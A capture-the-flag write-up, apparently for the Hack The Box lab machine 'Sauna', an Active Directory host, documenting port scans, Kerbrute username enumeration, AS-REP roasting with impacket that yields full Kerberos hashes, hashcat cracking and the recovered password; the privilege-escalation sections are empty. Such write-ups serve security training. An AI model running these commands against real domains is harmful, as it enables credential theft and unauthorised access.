---
description: 09-26-22
---

# Sauna (Easy)

### Improved skills

* Skill 1
* Skill 2

### Used tools

* Nmap -- NmapAutomator.sh

## Information Gathering

Enumerated TCP Ports:

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-09-27 03:12:54Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49668/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
49723/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Enumerated UDP ports:

```
PORT    STATE SERVICE
53/udp  open  domain
123/udp open  ntp
389/udp open  ldap
```

Notes:

* HTTP, we visit the web server and we can see what we have access to
  * Possible Users:
    * Johnson
    * Watson
    * Admin
    * Jenny joy
    * James Doe
    * Fergus Smith
    * Shaun Coins
    * Hugo Bear
    * Bowie Taylor
    * Sophie Driver
    * Steven Kerb
* From DNS, we see that we have a domain name:

&#x20;<mark style="color:yellow;">EGOTISTICAL-BANK.LOCAL</mark>

* Added to /etc/hosts
* 88 We have Kerberos open. We can attempt Kerberoasting/AS-REPRoasting if we enumerate users
* WinRM is open



## Enumeration

### Port 80 - HTTP (IIS 10.0)

Title: Egotistical Bank

Contains: Search function and Comments function. Both appear broken

* <mark style="color:yellow;">"405 HTTP Verb used to access this page is not allowed."</mark>

Dirsearch

```
dirsearch -u http://10.129.148.212                                                         Mon 26 Sep 2022 04:32:58 PM EDT

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/xyconix/.dirsearch/reports/10.129.148.212/_22-09-26_16-33-01.txt

Error Log: /home/xyconix/.dirsearch/logs/errors-22-09-26_16-33-01.log

Target: http://10.129.148.212/

[16:33:01] Starting: 
[16:33:03] 403 -  312B  - /%2e%2e//google.com                              
[16:33:08] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd           
[16:33:08] 200 -   30KB - /about.html                                       
[16:33:16] 200 -   15KB - /contact.html                                     
[16:33:16] 301 -  149B  - /css  ->  http://10.129.148.212/css/              
[16:33:19] 301 -  151B  - /fonts  ->  http://10.129.148.212/fonts/          
[16:33:20] 301 -  152B  - /images  ->  http://10.129.148.212/images/        
[16:33:20] 403 -    1KB - /images/
[16:33:20] 200 -   32KB - /index.html
```

* <mark style="color:yellow;">We are able to grab some potential usernames from the content of the site</mark>
* <mark style="color:yellow;">I attempted to use the usernames that I manually enumerated but none of them worked</mark>
* <mark style="color:yellow;">Let's use the giant wordlist found in /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt</mark>

### Kerbrute - Username Enumeration

```
./kerbrute_linux_amd64 userenum -d EGOTISTICAL-BANK.LOCAL /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.129.148.212

2022/09/26 16:55:10 >  [+] VALID USERNAME:       administrator@EGOTISTICAL-BANK.LOCAL
2022/09/26 16:56:37 >  [+] VALID USERNAME:       hsmith@EGOTISTICAL-BANK.LOCAL
2022/09/26 16:56:54 >  [+] VALID USERNAME:       Administrator@EGOTISTICAL-BANK.LOCAL
2022/09/26 16:57:42 >  [+] VALID USERNAME:       fsmith@EGOTISTICAL-BANK.LOCAL
2022/09/26 17:03:35 >  [+] VALID USERNAME:       Fsmith@EGOTISTICAL-BANK.LOCAL

```

* administrator
* hsmith
* fsmith
* I went ahead and put these in a new users file called <mark style="color:yellow;">users1</mark>
* Let's attempt AS-REP Roasting for an easy win before we go any further into our enumeration

### Port 389 - LDAP&#x20;

Enum4Linux

```
enum4linux -a 10.129.148.212
```

## Exploitation

### AS-REP Roasting

This is the exploit that I used to gain access to the fsmith account

GetNPUsers

```
impacket-GetNPUsers  EGOTISTICAL-BANK.LOCAL/ -usersfile users1 -o-pass

[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User hsmith doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:6bc5a5d28ad416aaa29561e9c952ab96$57c51c39c7c65cebda2e2550f78dbbd7750534e2ce7e610f407e180b44b1cbeac8ef6c976cf2238537412698a47c081e291b67b7d8804380fa048031ef8fea043178f49a60bfe764ed715dbced0dd1c9bfe24b19c71931032c789b0d7c378e6f299293c562f797be0d2c91153c512dc1357aff4fb48b3382160f0182c500e68b1a5387cb22cdaacec06f3dc55a8b49c0f2c72f0cd2a2256569c84309d8421b4df28258b742fc6583bb1e2151f424ce84b639fb9d065e55c156d2383c2849c44e0e3b0cb8ce3a6ec1544e1d048fc21cdaf26004b61c168d05b41964708f69eef4d78f0da3e5c7345c7c36ab85c9a8ffe64ae5824380ae9ab0ecde7e987716dda3
$krb5asrep$23$Fsmith@EGOTISTICAL-BANK.LOCAL:b829642fd9df4d29d5262b7913e4c7d0$4e348b434d64ba8afa4f5133bc4650061e39d77f3a89e098f6631ed979cf40c0d90cdc8520378d77a3079f8bc98c3e930a5db4820d6782b5fb86822d783d400c1bd231a4ecc16dbf7917775ddcbf9c5b76183b517e761939a8f0ddb40674e72f47746acef52d8f4336cc85d120bcaebd0aa087c09d8310d59be00a39336c70a440e0606e3f353fdf9daf3a72a8746c759deeaa6e0b24e397b328672b12e271292eb6caae6f71d54e53b7c2bc4b00dc337b737c15bd17fb3b4b9af03e4ebe598c06d49239ffc0e824a429c87bbb66b1ac92f8cab163a1244c6b2945c7b5145eaaa4c11f6e4ce91cee99d15eb3555dd70dc717dfda7b5405381a5221c17d9a071f
```

* We see that we successfully obtained hashes for the fsmith account
* Now that we have this hash, let's take it offline and crack it with hashcat!

### Cracking Hash w/ Hashcat

```
hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt --force
```

* We have success!
* <mark style="color:yellow;">Thestrokes23</mark>
* The next logical step is to try to evil-winrm into the box

## Privilege Escalation

### Local enumeration

### PrivEsc vector

## Proofs
